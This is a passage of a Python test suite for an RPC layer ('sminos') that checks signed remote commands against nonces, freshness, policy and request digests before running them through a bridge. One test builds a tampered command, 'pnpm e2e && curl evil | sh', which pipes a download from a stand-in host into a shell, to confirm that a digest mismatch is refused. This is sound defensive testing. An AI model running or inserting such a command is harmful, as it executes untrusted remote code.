#!/usr/bin/env python3
"""The RPCs on the machine side (DC7 M3 of the desk): DX6's RPCs verified,
bound to where they run, checked against the machine's policy, executed at
most once through DC2's bridge (or `sminos` for spawn and retire), and
answered as DX2 `rpc-result`, republished until `rpc-ack`.

Two halves.

- `Checks` drives `sminos_rpc.Rpcs` in this process against DC2's real
  bridge child, with this test as its mod (`Mod`: commands answered as
  bridge.tsx answers them), and a `claude` stand-in (fake_claude.py) for
  spawn, retire, and resume.
  Each refusal of DX6's order is produced on purpose, and the ledger's
  claims are reconciled from their traces.
- `Uplink` runs `sminos daemon uplink` against the hub stand-in
  (hub_standin.py, unchanged: the test sends `rpc` and `rpc-ack` down and
  reads the `rpc-result`s the uplink posted), or against DC3's local hub when
  DESK_HUB names its stand-in for Access (the test is a browser of the
  project, sending DX3 `rpc` and reading `rpc-state`): a cut after
  execution and a restart between execution and report each resolve with
  the RPC executed once, and a spawn retried with its nonce after a cut
  yields one session.

Hermetic: HOME and SMINOS_HOME are temporary (test_session_plane's); nothing
reaches beyond 127.0.0.1 and this directory.
"""

import base64
import hashlib
import json
import os
import shutil
import signal
import subprocess
import sys
import threading
import time
import unittest
import uuid as uuidlib
from unittest import mock

import test_session_plane as tsp  # noqa: E402 — first: it makes this run's HOME and SMINOS_HOME
import test_policy_requests as tpr  # noqa: E402

import sminos  # noqa: E402
import sminos_bridge as bridgemod  # noqa: E402
import sminos_codes as codes  # noqa: E402
import sminos_media as media  # noqa: E402
import sminos_plane as plane  # noqa: E402
import sminos_policy as policy  # noqa: E402
import sminos_requests as requests  # noqa: E402
import sminos_rpc as rpcs  # noqa: E402

T = tsp.T
KEY = tpr.KEY
CLI = tpr.CLI
MEMBER = tpr.MEMBER
GIT = tpr.GIT
wait_for = tpr.wait_for
cli = tpr.cli

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 24
PDF = b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\n"
TURN_UNKNOWN = "turn state unknown since the bridge reloaded; retry after the next model request"
LAUNCH = "-Lm7launch0000000000AA"   # the bridged session's launch (O12 M7): base64url, here starting with `-`
STALE = "Lm7launch-before-reopen"  # a launch the session ran under before it was reopened


def install_claude(name):
    """The `claude` stand-in first on PATH; its state directory."""
    bindir = os.path.join(T, "bin-" + name)
    state = os.path.join(T, "claude-" + name)
    os.makedirs(bindir, exist_ok=True)
    os.makedirs(state, exist_ok=True)
    path = os.path.join(bindir, "claude")
    if not os.path.lexists(path):
        os.symlink(os.path.join(tsp.HERE, "fake_claude.py"), path)
    os.environ["PATH"] = bindir + os.pathsep + os.environ["PATH"]
    os.environ["FAKE_CLAUDE_STATE"] = state
    return state


def stop_holders(state):
    """Every session process the stand-in started, ended."""
    try:
        with open(os.path.join(state, "holders")) as f:
            pids = [int(line.split()[0]) for line in f if line.strip()]
    except OSError:
        return
    for pid in pids:
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass


def resumes(state, sid):
    """The `--bg --resume` launches the stand-in saw for the session:
    [{args, cwd}]."""
    try:
        with open(os.path.join(state, "resumes.log")) as f:
            calls = [json.loads(line) for line in f if line.strip()]
    except OSError:
        return []
    return [c for c in calls if c["args"][c["args"].index("--resume") + 1] == sid]


def holders_of(sid):
    """The engine's records of processes holding the session that run: [rec]."""
    out = []
    for name in os.listdir(os.path.join(os.environ["HOME"], ".claude", "sessions")):
        try:
            with open(os.path.join(os.environ["HOME"], ".claude", "sessions", name)) as f:
                rec = json.load(f)
        except (OSError, ValueError):
            continue
        if rec.get("sessionId") == sid and sminos.pid_alive(rec.get("pid")):
            out.append(rec)
    return out


def ended_session(root):
    """A terminal session of the project at `root` that ran here and ended:
    joined, its process gone, its membership retired `ended`, its transcript
    kept."""
    s = tpr.Session(root, inbox=False)
    sminos.reconcile(tpr.project_of(root))
    append_row(s.sid, {"type": "user", "uuid": str(uuidlib.uuid4()), "timestamp": iso(time.time()), "cwd": root,
                       "sessionId": s.sid, "message": {"role": "user", "content": "hello"}})
    s.end()
    sminos.reconcile(tpr.project_of(root))
    latest = sminos.view_of(tpr.project_of(root), titles=False).info[s.sid]["latest"]
    assert (latest["kind"], latest.get("reason")) == ("retired", "ended"), latest
    return s.sid


def launches(state):
    """The `--bg` launches the stand-in saw, each its argv."""
    try:
        with open(os.path.join(state, "calls.log")) as f:
            calls = [json.loads(line) for line in f if line.strip()]
    except OSError:
        return []
    return [c for c in calls if "--bg" in c]


def iso(epoch):
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(epoch)) + ".%03dZ" % int((epoch % 1) * 1000)


def sign(key, name, project, args, machine="testhost", created=None, nonce=None, member=MEMBER, op_id=None,
         op_created=None):
    """An RPC as the browser seals it (DX6, DX1); with `op_id` (and
    `op_created`), as an app keying it by an operation id (RL4) seals it."""
    draft = {"rpc": name, "project": project, "machine": machine, "member": member,
             "created": created or iso(time.time()), "nonce": nonce or codes.b64url(os.urandom(16)), "args": args}
    if op_id is not None:
        draft["opId"] = op_id
    if op_created is not None:
        draft["opCreated"] = op_created
    return codes.seal(key, "rpc", project, draft, None)


def new_op():
    """An operation id as an app chooses one: 128 random bits, base64url."""
    return codes.b64url(os.urandom(16)) + "op"


def digest_of(sid, rid, tool, tool_input):
    return {"session": sid, "request": rid, "tool": tool, "input_sha256": codes.input_sha256(tool_input)}


def transcript(sid):
    d = os.path.join(os.environ["HOME"], ".claude", "projects", "-rpc-test")
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, sid + ".jsonl")


def append_row(sid, row):
    with open(transcript(sid), "a") as f:
        f.write(json.dumps(row) + "\n")


def start_job(sid, task, kind="shell", agent=None):
    """A background shell's or monitor's start, as the engine writes it: the
    call, then its result naming the task (in a subagent's own transcript
    for `agent`)."""
    path = transcript(sid)
    if agent:
        path = os.path.join(path[:-len(".jsonl")], "subagents", "agent-%s.jsonl" % agent)
        os.makedirs(os.path.dirname(path), exist_ok=True)
    call = "toolu_" + task
    tool, tur, text = (("Bash", {"backgroundTaskId": task},
                        "Command running in background with ID: %s. Output is being written to: /tmp/%s.output"
                        % (task, task)) if kind == "shell"
                       else ("Monitor", {"taskId": task, "timeoutMs": 300000, "persistent": False},
                             "Monitor started (task %s, timeout 300000ms)." % task))
    now = iso(time.time())
    with open(path, "a") as f:
        f.write(json.dumps({"type": "assistant", "uuid": str(uuidlib.uuid4()), "timestamp": now, "message": {
            "role": "assistant", "content": [{"type": "tool_use", "id": call, "name": tool,
                                              "input": {"command": "sleep 600", "description": task}}]}}) + "\n")
        f.write(json.dumps({"type": "user", "uuid": str(uuidlib.uuid4()), "timestamp": now, "toolUseResult": tur,
                            "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": call,
                                                                     "content": text}]}}) + "\n")


def end_job(sid, task, status):
    """A task's notification, as the engine queues it when the task ends."""
    append_row(sid, {"type": "attachment", "uuid": str(uuidlib.uuid4()), "timestamp": iso(time.time()),
                     "attachment": {"type": "queued_command", "commandMode": "task-notification",
                                    "prompt": "<task-notification>\n<task-id>%s</task-id>\n<status>%s</status>\n"
                                              "<summary>done</summary>\n</task-notification>" % (task, status)}})


class Mod(tpr.Bridge):
    """DC2's bridge child with this test as its mod: each command answered
    as bridge.tsx answers it. `turn` is the main turn running (None: idle);
    `hold` delays each answer; a steer's row is written to the transcript
    before its answer, as the engine writes an appended row. A desk command
    is answered `queued` at once, then its run's start and end posted, as
    bridge.tsx's `after` does (`refuse_commands`: name → (code, reason) the
    route check refuses; `hold_runs`: the end waits in `held_runs`, as a run
    queued behind a turn; a `/reload-plugins` posts its start alone, or,
    with `refuse_reload` the engine's refusal, its end failed after it, as
    bridge.tsx's reloadPlugins does)."""

    def __init__(self, sid, launch=None):
        self.commands = []
        self.turn = None
        self.hold = 0.0
        self.answer_steer = True  # False: the row is written, the answer never comes
        self.unknown = False      # True: loaded into a conversation, its turn state not known yet (DC2 27c46947)
        self.stop_fails = {}      # task id → the engine's error for its TaskStop
        self.refuse_commands = {}
        self.hold_runs = False
        self.held_runs = []
        self.refuse_reload = None
        self.refuse_btw = None    # the bridge's refusal of a side question: (code, reason)
        self.refuse_agents = {}   # an agent's id or name → the bridge's refusal of a stop-agent or tell: (code, reason)
        self.names = {}           # an agent's name → the id the engine's list resolves it to (a caller that gave none)
        self.note_error = None    # why a stop's note was not kept
        self.cwd = "/"            # the session's live working directory, as `read status` answers it
        self.uploads = {}         # an upload the mod holds → its op
        self.refuse_media = None  # the bridge's refusal of an upload: (code, reason)
        self.observer = False     # an observer's bridge (a MAWS lane B session, O12 M3): every control op refused lane-b
        self.rows = []
        super().__init__(sid, launch=launch)

    def drain(self):
        with self.proc.stdout:
            for line in self.proc.stdout:
                cmd = json.loads(line)
                self.commands.append(cmd)
                threading.Thread(target=self.answer, args=(cmd,), daemon=True).start()

    def ops(self, op):
        return [c for c in self.commands if c.get("op") == op]

    def answer(self, cmd):
        time.sleep(self.hold)
        op = cmd["op"]
        after = []
        if self.observer and op not in ("ping", "read"):
            res = {"ok": False, "error": "MAWS controls this session", "code": "lane-b"}
        elif self.unknown and op in ("steer", "interrupt", "compact"):
            res = {"ok": False, "error": TURN_UNKNOWN}
        elif op == "steer":
            if self.turn is None:
                res = {"ok": False, "error": "no turn is running to steer: send it instead"}
            else:
                row = str(uuidlib.uuid4())
                self.rows.append(row)
                append_row(self.sid, {"type": "user", "uuid": row, "timestamp": iso(time.time()),
                                      "message": {"role": "user", "content": [{"type": "text", "text": cmd["text"]}]}})
                if not self.answer_steer:
                    return
                res = {"ok": True, "result": {"row": row}}
        elif op == "interrupt":
            res = {"ok": True, "result": {"turnId": self.turn, "stopped": ["b1x2y3z4"] if self.turn else [],
                                          "running": []}}
        elif op == "stop":
            if cmd["taskId"] in self.stop_fails:
                res = {"ok": False, "error": self.stop_fails[cmd["taskId"]]}
            else:
                # The mod's note, which the engine keeps isMeta from the plugin: the rows' record of the stop.
                append_row(self.sid, {"type": "user", "uuid": str(uuidlib.uuid4()), "timestamp": iso(time.time()),
                                      "isMeta": True, "origin": {"kind": "plugin", "name": "doperpowers"},
                                      "message": {"role": "user", "content": [{"type": "text", "text": (
                                          "Task %s, a background task, was stopped from %s: it is not running."
                                          % (cmd["taskId"], "the desk" if cmd.get("from") == "desk"
                                             else "outside the terminal"))}]}})
                res = {"ok": True, "result": {"taskId": cmd["taskId"]}}
        elif op == "model":
            model = None if cmd.get("model") in (None, "default") else cmd["model"]
            self.post({"type": "model", "model": model, "effort": cmd.get("effort")})
            res = {"ok": True, "result": {"model": model, "effort": cmd.get("effort")}}
        elif op == "compact":
            if self.turn is not None:
                res = {"ok": True, "result": {"queued": True, "turnId": self.turn}}
            else:
                res = {"ok": True, "result": {"started": True}}
                after = [{"type": "compact", "phase": "start", "id": cmd["id"]},
                         {"type": "compact", "phase": "end", "id": cmd["id"], "tokensBefore": 9000,
                          "tokensAfter": 1200}]
        elif op == "deliver":
            self.delivered.append(cmd["text"])
            self.post({"type": "delivered", "key": cmd["key"], "outcome": "submitted"})
            res = {"ok": True, "result": {"submitted": True}}
        elif op == "btw":
            if self.refuse_btw:
                code, why = self.refuse_btw
                res = {"ok": False, "error": why, "code": code}
            else:
                res = {"ok": True, "result": {"started": True, "id": cmd["id"]}}
                end = {"type": "btw", "phase": "end", "id": cmd["id"], "text": "Keep it per session.",
                       "usage": {"input": 12, "output": 34, "cacheRead": 5000, "cacheWrite": 7}, "t": 0}
                after = [None, {"type": "btw", "phase": "start", "id": cmd["id"], "t": 0}]
                if self.hold_runs:
                    self.held_runs.append(end)
                else:
                    after.append(end)
        elif op in ("stop-agent", "tell"):
            ref = cmd["agentId"]
            if ref in self.refuse_agents:
                code, why = self.refuse_agents[ref]
                res = {"ok": False, "error": why, "code": code}
            elif op == "tell":
                res = {"ok": True, "result": {"sent": True}}
            else:
                resolved = cmd.get("resolvedAgentId") or self.names.get(ref, ref)
                res = {"ok": True, "result": {"agentId": ref, "accepted": True,
                                              **({"resolvedAgentId": resolved} if resolved != ref else {}),
                                              **({"noteError": self.note_error} if self.note_error else {})}}
        elif op == "read" and cmd.get("what") == "status":
            res = {"ok": True, "result": {"cwd": self.cwd, "root": self.cwd, "model": None}}
        elif op == "media":
            upload = cmd["upload"]
            missing = [f["name"] for f in cmd["files"] if not os.path.isfile(f["path"])]
            if self.refuse_media:
                code, why = self.refuse_media
                res = {"ok": False, "error": why, "code": code}
            elif upload in self.uploads:
                res = {"ok": True, "result": {"duplicate": True, "upload": upload}}
            elif missing:
                res = {"ok": False, "error": "%s is missing" % missing[0]}
            else:
                # Held, then each attachment read and forwarded, as bridge-media.tsx says them.
                self.uploads[upload] = cmd
                res = {"ok": True, "result": {"queued": True, "upload": upload}}
                states = {f["n"]: "pending" for f in cmd["files"]}
                after = [None]
                for f in cmd["files"]:
                    for state in ("read", "forwarded"):
                        states[f["n"]] = state
                        ended = all(x == "forwarded" for x in states.values())
                        e = {"type": "media", "id": upload, "upload": upload, "index": f["n"], "state": state,
                             "phase": "end" if ended else "start", "toolUseId": "toolu_sminos_%024d" % f["n"],
                             "attachments": [{"index": n, "state": x} for n, x in sorted(states.items())]}
                        if self.hold_runs and ended:
                            self.held_runs.append(e)
                        else:
                            after.append(e)
        elif op == "command":
            name, args = cmd.get("name"), cmd.get("args") or ""
            if name in self.refuse_commands:
                code, why = self.refuse_commands[name]
                res = {"ok": False, "error": why, "code": code}
            else:
                res = {"ok": True, "result": {"queued": True, "route": "run", "id": cmd["id"]}}
                run = {"type": "run", "id": cmd["id"], "name": name, "args": args, "t": 0}
                after = [None, {**run, "phase": "start"}]
                end = {**run, "phase": "end", "settled": {"ok": True},
                       "readback": {"how": "row", "text": "Session renamed to: %s" % args, "uuid": "row-r1"}}
                if name == "reload-plugins":
                    end = self.refuse_reload and {**run, "phase": "end", "settled": {"ok": False, "error": self.refuse_reload},
                                                  "readback": {"how": "none"}}
                if not end:
                    pass
                elif self.hold_runs:
                    self.held_runs.append(end)
                else:
                    after.append(end)
        else:
            res = {"ok": False, "error": "unknown op: %s" % op}
        if op == "compact" and after:
            self.post(after[0])
        self.post({"type": "result", "id": cmd["id"], "op": op, **res})
        for e in after[1:]:
            self.post(e)


def held_child(bridges, sid):
    """The child the plane's last probe found answering for the session."""
    return bridges.answering(sid)[0]


class Probes:
    """The plane's probe as `effects` reads it: each `answer` a probe begun
    and answered by that child, for every session."""

    def __init__(self):
        self.child, self.begun = None, 0

    def answer(self, child):
        self.child, self.begun = child, self.begun + 1

    def answering(self, _sid):
        return self.child, self.begun, self.begun


class Here:
    """What the uplink knows of this machine, as sminos_rpc asks it."""

    def __init__(self, project, sessions, live):
        self.p = project
        self.sessions = sessions
        self.live = live

    def project(self, pid):
        return self.p if pid == self.p.id else None

    def has_session(self, _project, sid):
        return sid in self.sessions

    def record(self, sid):
        return self.live.get(sid)

    def checkouts(self, project):
        return policy.known_checkouts(project)

    def cwd(self, project, sid):
        sminos.forget_caches()
        joined = (sminos.view_of(project, titles=False).info.get(sid) or {}).get("joined") or {}
        return joined.get("cwd") or ""


def results(frames, nonce):
    return [f["outcome"] for f in frames if f.get("t") == "rpc-result" and f.get("nonce") == nonce]


class LaneVerdict(unittest.TestCase):
    """O12 M3: the bridge child's lane verdict rests on one observation of
    the session's parent, never two (a failed `ps` then a good one must not
    read as another parent)."""

    def setUp(self):
        self.config = os.path.join(T, "lane-config")
        os.makedirs(os.path.join(self.config, "sessions"), exist_ok=True)
        self.sid = str(uuidlib.uuid4())
        with open(os.path.join(self.config, "sessions", "4300.json"), "w") as f:
            json.dump({"pid": 4300, "sessionId": self.sid}, f)

    SESSION_STARTED = 1_000_000.0

    def verdict(self, observations, host_alive=True, host_started=SESSION_STARTED - 60):
        """The verdict over these parent observations, the marker's process
        (4242) alive or not, started then; the session's at SESSION_STARTED."""
        seen = list(observations)
        started = {4300: self.SESSION_STARTED, 4242: host_started}
        with mock.patch.dict(os.environ, {"SMNS_MEMBER": "4242", "CLAUDE_CONFIG_DIR": self.config}), \
                mock.patch.object(bridgemod.S, "parent_pid", side_effect=lambda _pid: seen.pop(0)) as pp, \
                mock.patch.object(bridgemod.S, "pid_alive", side_effect=lambda pid: int(pid) != 4242 or host_alive), \
                mock.patch.object(bridgemod, "process_state", side_effect=lambda pid: "S" if host_alive else None), \
                mock.patch.object(bridgemod, "process_started", side_effect=lambda pid: started.get(int(pid))):
            got = bridgemod.lane_verdict(self.sid, 4300)
        return got, pp.call_count

    def test_lane_verdict_is_one_parent_observation(self):
        self.assertEqual(self.verdict([None, 4242]), ("unresolved", 1), "a ps that failed is unresolved, whatever a second says")
        self.assertEqual(self.verdict([4242, 77]), ("match", 1))
        self.assertEqual(self.verdict([77, 4242]), ("mismatch", 1),
                         "a claude a lane B session's Bash started: the host alive, older, not its parent")

    def test_lane_verdict_mismatch_needs_a_live_older_host_that_is_not_the_parent(self):
        """The host exited before a retry: the engine re-parented, to PID 1
        or a subreaper, is no evidence of another spawner."""
        for reparented in (1, 777):
            self.assertEqual(self.verdict([None]), ("unresolved", 1))
            self.assertEqual(self.verdict([reparented], host_alive=False)[0], "unresolved",
                             "re-parented to %d, the host gone" % reparented)
        self.assertEqual(self.verdict([777], host_started=self.SESSION_STARTED + 5)[0], "unresolved",
                         "the marker's pid reused by a process younger than the session")
        self.assertEqual(self.verdict([777], host_started=None)[0], "unresolved", "its start unreadable")
        self.assertEqual(self.verdict([777], host_started=self.SESSION_STARTED)[0], "unresolved",
                         "a host started in the session's own second is no evidence: only an earlier second is")

    def test_lane_verdict_an_exited_unreaped_host_is_no_host(self):
        """A host that exited and was not reaped (a zombie) still answers
        kill(pid, 0) and keeps a readable start: it is gone all the same."""
        zombie = subprocess.Popen(["true"])
        try:
            self.assertTrue(wait_for(lambda: bridgemod.process_state(zombie.pid) == "Z", 10), "the host is a zombie")
            self.assertTrue(sminos.pid_alive(zombie.pid), "kill(pid, 0) still answers for it")
            started = {4300: self.SESSION_STARTED, zombie.pid: self.SESSION_STARTED - 60}
            with mock.patch.dict(os.environ, {"SMNS_MEMBER": str(zombie.pid), "CLAUDE_CONFIG_DIR": self.config}), \
                    mock.patch.object(bridgemod.S, "parent_pid", return_value=1), \
                    mock.patch.object(bridgemod, "process_started", side_effect=lambda pid: started.get(int(pid))):
                self.assertEqual(bridgemod.lane_verdict(self.sid, 4300), "unresolved")
        finally:
            zombie.wait()


class Checks(unittest.TestCase):
    """DX6's checks in order, and execution through the real bridge child."""

    @classmethod
    def setUpClass(cls):
        cls.claude = install_claude("checks")
        cls.root, cls.pid = tpr.make_project("rpcproj")
        subprocess.run(GIT + ["-C", cls.root, "commit", "-q", "--allow-empty", "-m", "base"], check=True)
        cls.other_root, cls.other_pid = tpr.make_project("rpcother")
        cls.bridged = tpr.Session(cls.root)
        cls.plain = tpr.Session(cls.root)
        # The module names its process's launch, as bridge.tsx does (O12 M7):
        # a DX2 RPC names none, and runs as it always did.
        cls.mod = Mod(cls.bridged.sid, launch=LAUNCH)
        r = cli("daemon", "tick")
        assert r.returncode == 0, r.stderr
        cls.project = tpr.project_of(cls.root)
        cls.ended = str(uuidlib.uuid4())

    @classmethod
    def tearDownClass(cls):
        cls.mod.stop()
        cls.bridged.end()
        cls.plain.end()
        stop_holders(cls.claude)

    def setUp(self):
        tpr.clear_policy()
        try:
            os.unlink(os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE))
        except OSError:
            pass
        tpr.forget_owed()   # no compaction message an earlier test left owed
        self.mod.turn = None
        self.mod.hold = 0.0
        self.mod.answer_steer = True
        self.mod.unknown = False
        self.mod.stop_fails = {}
        self.mod.refuse_commands = {}
        self.mod.hold_runs = False
        self.mod.held_runs = []
        self.mod.refuse_reload = None
        self.mod.refuse_btw = None
        self.mod.refuse_agents = {}
        self.mod.note_error = None
        self.mod.names = {}
        self.mod.cwd = self.root
        self.mod.uploads = {}
        shutil.rmtree(os.path.join(self.root, ".claude", "desk-uploads"), ignore_errors=True)   # an earlier test's
        self.mod.refuse_media = None
        self.mod.observer = False
        self.mod.commands.clear()
        self.clock = [time.time()]
        self.r = rpcs.Rpcs(KEY, "testhost", clock=lambda: self.clock[0])
        live = {self.bridged.sid: {"pid": self.bridged.holder.pid, "kind": "interactive", "status": "busy"},
                self.plain.sid: {"pid": self.plain.holder.pid, "kind": "interactive", "status": "busy"}}
        self.here = Here(self.project, {self.bridged.sid, self.plain.sid, self.ended}, live)
        self.frames = []

    def tearDown(self):
        tpr.clear_policy()

    def send(self, name, args, **kw):
        rpc = sign(KEY, name, kw.pop("project", self.pid), args, **kw)
        self.r.receive(rpc, self.here)
        return rpc

    def collect(self):
        frames = self.r.due({self.pid, self.other_pid})
        self.r.sent(frames)
        self.frames += frames
        return self.frames

    def outcome(self, rpc, timeout=15.0):
        got = wait_for(lambda: results(self.collect(), rpc["nonce"]), timeout)
        self.assertTrue(got, "a result for %s" % rpc["rpc"])
        return got[-1]

    def refused(self, rpc, code):
        o = self.outcome(rpc)
        self.assertEqual(o["state"], "failed", o)
        self.assertEqual(o["error"]["code"], code, o)
        self.assertTrue(o["error"]["message"])
        return o

    def ledger(self):
        try:
            with open(os.path.join(os.environ["SMINOS_HOME"], "daemon", rpcs.LEDGER_FILE)) as f:
                return json.load(f)
        except OSError:
            return {}

    # ------------------------------------------------ before the ledger

    def test_a_bad_code_is_refused_and_kept_out_of_the_ledger(self):
        rpc = sign(KEY, "steer", self.pid, {"session": self.bridged.sid, "text": "go"})
        rpc["args"]["text"] = "something else"
        self.mod.turn = "t1"
        self.r.receive(rpc, self.here)
        self.refused(rpc, "bad-code")
        self.assertNotIn(rpc["nonce"], self.ledger())
        self.assertEqual(self.mod.ops("steer"), [], "nothing ran")
        other = sign(b"\x01" * 32, "steer", self.pid, {"session": self.bridged.sid, "text": "go"})
        self.r.receive(other, self.here)
        self.refused(other, "bad-code")

    def test_b_where_it_runs_is_checked_before_the_ledger_and_freshness(self):
        stale = iso(time.time() - 600)
        wrong = self.send("steer", {"session": self.bridged.sid, "text": "go"}, machine="mini", created=stale)
        self.refused(wrong, "wrong-machine")
        # Signed for the other project (a hub project of this org, but not
        # where the session is): the session is not that project's.
        outside = self.send("interrupt", {"session": self.bridged.sid}, project=self.other_pid, created=stale)
        self.refused(outside, "unknown-project")
        nobody = self.send("interrupt", {"session": str(uuidlib.uuid4())}, created=stale)
        self.refused(nobody, "no-session")
        for rpc in (wrong, outside, nobody):
            self.assertNotIn(rpc["nonce"], self.ledger(), "refused before the ledger")
        self.assertEqual(self.mod.ops("interrupt"), [])

    def test_b_a_session_outside_its_signed_project_is_refused(self):
        here = Here(self.project, set(), {})
        here.project = lambda pid: {self.pid: self.project, self.other_pid: tpr.project_of(self.other_root)}.get(pid)
        here.has_session = lambda project, sid: project.id == self.pid and sid == self.bridged.sid
        rpc = sign(KEY, "interrupt", self.other_pid, {"session": self.bridged.sid})
        self.r.receive(rpc, here)
        self.refused(rpc, "no-session")
        self.assertEqual(self.mod.ops("interrupt"), [])

    # ------------------------------------------------ the ledger, then freshness

    def test_c_a_known_nonce_is_answered_from_the_ledger_before_freshness(self):
        self.mod.turn = "t1"
        rpc = self.send("steer", {"session": self.bridged.sid, "text": "once"})
        first = self.outcome(rpc)
        self.assertEqual(first["state"], "done", first)
        self.clock[0] += 120  # long past its freshness: the ledger still answers it
        self.r.receive(rpc, self.here)
        again = wait_for(lambda: len(results(self.collect(), rpc["nonce"])) >= 2 and results(self.frames, rpc["nonce"]))
        self.assertTrue(again, "answered again")
        self.assertEqual(again[-1], first, "from the ledger")
        self.assertEqual(len(self.mod.ops("steer")), 1, "executed once")

    def test_c_stale_either_way(self):
        old = self.send("interrupt", {"session": self.bridged.sid}, created=iso(time.time() - 61))
        self.refused(old, "stale")
        ahead = self.send("interrupt", {"session": self.bridged.sid}, created=iso(time.time() + 61))
        self.refused(ahead, "stale")
        self.assertEqual(self.mod.ops("interrupt"), [])
        self.assertEqual(self.ledger()[old["nonce"]]["outcome"]["error"]["code"], "stale", "kept: one answer a nonce")

    def test_c_a_stale_rpc_is_said_in_daemon_log_with_its_times(self):
        """One line: when the browser created it, when the stream's reader
        took it, and its age when checked, so a hold on the way (the hub's
        queue, the uplink's main thread) can be told from a late send."""
        created = time.time() - 61.5
        received = self.clock[0] - 0.75
        rpc = sign(KEY, "interrupt", self.pid, {"session": self.bridged.sid}, created=iso(created))
        self.r.receive(rpc, self.here, received)
        self.refused(rpc, "stale")
        with open(os.path.join(os.environ["SMINOS_HOME"], "daemon.log")) as f:
            lines = [line for line in f if rpc["nonce"] in line]
        self.assertEqual(len(lines), 1, lines)
        self.assertIn("refused stale", lines[0])
        self.assertIn("created %s" % rpc["created"], lines[0])
        self.assertIn("received %s" % rpcs.stamp(received), lines[0])
        self.assertIn("%.3f s old" % (self.clock[0] - rpcs.created_at(rpc["created"])), lines[0])

    def test_c_the_ledger_keeps_each_rpcs_created_and_when_it_was_done(self):
        """A Resume's breakdown (click → claim → launch → done) reads off its
        entry: `created`, `at`, `launched_at`, `done_at`. A refusal kept from
        the ledger on carries them too."""
        self.mod.turn = "t1"
        ran = self.send("steer", {"session": self.bridged.sid, "text": "timed"}, created=iso(self.clock[0] - 2))
        self.assertEqual(self.outcome(ran)["state"], "done")
        stale = self.send("interrupt", {"session": self.bridged.sid}, created=iso(self.clock[0] - 90))
        self.refused(stale, "stale")
        for rpc in (ran, stale):
            e = self.ledger()[rpc["nonce"]]
            self.assertAlmostEqual(e["created"], rpcs.created_at(rpc["created"]), places=3)
            self.assertGreaterEqual(e["done_at"], e["at"])
            self.assertLessEqual(e["created"], e["at"])

    # ------------------------------------------------ the policy

    def test_d_read_only_refuses_every_rpc(self):
        tpr.set_policy({"read_only": True})
        self.mod.turn = "t1"
        for name, args in (("steer", {"session": self.bridged.sid, "text": "x"}),
                           ("interrupt", {"session": self.bridged.sid}),
                           ("spawn", {"checkout": self.root, "brief": "b"}),
                           ("retire", {"session": self.plain.sid}),
                           ("resume", {"session": self.ended}),
                           ("stop", {"session": self.bridged.sid, "taskId": "bro1"}),
                           ("command", {"session": self.bridged.sid, "name": "rename", "args": "x"})):
            self.refused(self.send(name, args), "read-only")
        self.assertEqual(self.mod.commands, [], "nothing reached the bridge")
        self.assertEqual(launches(self.claude), [], "nothing launched")

    def test_d_spawn_outside_the_known_checkouts_or_above_the_ceiling(self):
        elsewhere = os.path.join(T, "elsewhere")
        os.makedirs(elsewhere, exist_ok=True)
        self.refused(self.send("spawn", {"checkout": elsewhere, "brief": "b"}), "unknown-checkout")
        self.refused(self.send("spawn", {"checkout": self.root + "/../" + os.path.basename(self.other_root),
                                         "brief": "b"}), "unknown-checkout")
        tpr.set_policy({"read_only": False, "ceiling": "default"})
        self.refused(self.send("spawn", {"checkout": self.root, "brief": "b", "permission_mode": "auto"}),
                     "above-ceiling")
        self.refused(self.send("spawn", {"checkout": self.root, "brief": "b", "permission_mode": "yolo"}),
                     "above-ceiling")
        self.assertEqual(launches(self.claude), [])

    # ------------------------------------------------ digest, then the session's kind

    def test_e_a_decision_is_bound_to_the_request_still_pending(self):
        tool_input = {"command": "pnpm e2e", "description": "Run the e2e suite"}
        self.mod.raise_("toolu_dg1", input_=tool_input)
        wait_for(lambda: self.request_info("toolu_dg1")[0] == 200)
        shown = dict(tool_input, command="pnpm e2e && curl evil | sh")
        bad = self.send("decide", {"session": self.bridged.sid, "decision": "allow",
                                   "digest": digest_of(self.bridged.sid, "toolu_dg1", "Bash", shown)})
        self.refused(bad, "digest-mismatch")
        gone = self.send("decide", {"session": self.bridged.sid, "decision": "allow",
                                    "digest": digest_of(self.bridged.sid, "toolu_nope", "Bash", tool_input)})
        self.refused(gone, "not-pending")
        good = self.send("decide", {"session": self.bridged.sid, "decision": "deny", "message": "not now",
                                    "digest": digest_of(self.bridged.sid, "toolu_dg1", "Bash", tool_input)})
        self.assertEqual(self.outcome(good), {"state": "done", "result": {}})
        status, body = self.mod_wait("toolu_dg1")
        self.assertEqual(status, 200, body)
        self.assertEqual(body["by"], MEMBER, "the decision is the member's")
        self.assertEqual(body["decision"], {"behavior": "deny", "message": "not now"})
        self.mod.settle("toolu_dg1", outcome="deny", winner="web", by=MEMBER)
        late = self.send("decide", {"session": self.bridged.sid, "decision": "allow",
                                    "digest": digest_of(self.bridged.sid, "toolu_dg1", "Bash", tool_input)})
        self.refused(late, "not-pending")

    def test_e_a_decision_that_does_not_fit_its_request_is_bad_shape_before_the_claim(self):
        """The bridge's own rule (composite dd908dfa), applied to the request
        the digest check fetched: nothing is claimed and nothing reaches the
        bridge; the nonce's one answer is the refusal."""
        questions = {"questions": [{"question": "Which branch?", "options": [{"label": "main"}]}]}
        self.mod.raise_("toolu_aq", tool="AskUserQuestion", input_=questions, **{"async": True})
        self.mod.raise_("toolu_sq", tool="AskUserQuestion", input_=questions)
        self.mod.raise_("toolu_pp", input_={"command": "make"})
        for rid in ("toolu_aq", "toolu_sq", "toolu_pp"):
            self.assertTrue(wait_for(lambda rid=rid: self.request_info(rid)[0] == 200), rid)
        sid = self.bridged.sid
        aq = digest_of(sid, "toolu_aq", "AskUserQuestion", questions)
        sq = digest_of(sid, "toolu_sq", "AskUserQuestion", questions)
        pp = digest_of(sid, "toolu_pp", "Bash", {"command": "make"})
        cases = {
            "a deny on an async question": ("decide", {"session": sid, "decision": "deny", "digest": aq}),
            "an answer to a permission prompt": ("answer", {"session": sid, "digest": pp,
                                                            "answers": {"Which branch?": "main"}}),
            "an allow on a question": ("decide", {"session": sid, "decision": "allow", "digest": sq}),
            "answers to a question it does not ask": ("answer", {"session": sid, "digest": sq,
                                                                 "answers": {"Which tag?": "v1"}}),
        }
        claims = []
        real_put = self.r.ledger.put
